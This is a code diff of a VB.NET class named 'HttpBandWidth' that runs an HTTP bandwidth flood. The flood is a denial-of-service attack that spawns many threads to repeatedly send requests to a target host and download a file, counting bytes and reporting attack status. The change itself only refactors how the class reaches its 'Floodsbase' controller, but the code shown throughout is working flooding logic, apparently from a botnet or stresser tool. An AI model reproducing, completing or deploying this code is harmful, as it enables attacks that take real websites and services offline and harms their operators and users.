@@ -16,10 +16,8 @@ Public Class HttpBandWidth
     Private Method As String
     Private PostDATA As String
     Private RandomFile As Boolean
-    Private _Floodsbase As Floodsbase
     Private File As String
-    Public Sub New(ByVal model As HttpBandWidthModel, ByVal Floodsbase As Floodsbase)
-        _Floodsbase = Floodsbase
+    Public Sub New(ByVal model As HttpBandWidthModel)
         If Not AttackRunning = True Then
             AttackRunning = True
             CutURL(model.Host)
@@ -30,7 +28,7 @@ Public Class HttpBandWidth
             RandomFile = model.RandomFile
             Port = model.Port
             Threads = New Thread(ThreadstoUse - 1) {}
-            _Floodsbase.SetMessage("Bandwidth attack")
+            GetFloodsBase().SetMessage("Bandwidth attack")
             For i As Integer = 0 To ThreadstoUse - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
@@ -38,7 +36,7 @@ Public Class HttpBandWidth
             Next
 
         Else
-            _Floodsbase.SetMessage("A Bandwidth Flood Attack is Already Running on " & HostToAttack)
+            GetFloodsBase().SetMessage("A Bandwidth Flood Attack is Already Running on " & HostToAttack)
         End If
 
     End Sub
@@ -50,7 +48,7 @@ Public Class HttpBandWidth
             ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            _Floodsbase.SetMessage("Bandwidth Flood on " & HostToAttack & " finished successfully, downloading the file " & attacks.ToString & " times.")
+            GetFloodsBase().SetMessage("Bandwidth Flood on " & HostToAttack & " finished successfully, downloading the file " & attacks.ToString & " times.")
             attacks = 0
         End If
 
@@ -65,10 +63,10 @@ Public Class HttpBandWidth
                 End Try
             Next
             AttackRunning = False
-            _Floodsbase.SetMessage("Bandwidth Flood on " & HostToAttack & " aborted successfully, downloading the file " & attacks.ToString & " times.")
+            GetFloodsBase().SetMessage("Bandwidth Flood on " & HostToAttack & " aborted successfully, downloading the file " & attacks.ToString & " times.")
             attacks = 0
         Else
-            _Floodsbase.SetMessage("No Bandwidth Flood Attack is Running!")
+            GetFloodsBase().SetMessage("No Bandwidth Flood Attack is Running!")
         End If
     End Sub
     Public Sub CutURL(ByVal url As String)
@@ -123,7 +121,7 @@ Public Class HttpBandWidth
                         socketArray(i).Send(ASCIIEncoding.Default.GetBytes(headerContent.ToString), SocketFlags.None)
 
                         attacks = attacks + 1
-                        _Floodsbase.Set_AttackUpStrengOnByte(attacks * headerContent.Length)
+                        GetFloodsBase().Set_AttackUpStrengOnByte(attacks * headerContent.Length)
 
                     Next i
                     Dim j As Integer
@@ -137,7 +135,7 @@ Public Class HttpBandWidth
                             sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                         Loop Until bytes > 0
 
-                        _Floodsbase.Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)
+                        GetFloodsBase().Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)
                     Next j
                     Continue Do
                 Catch
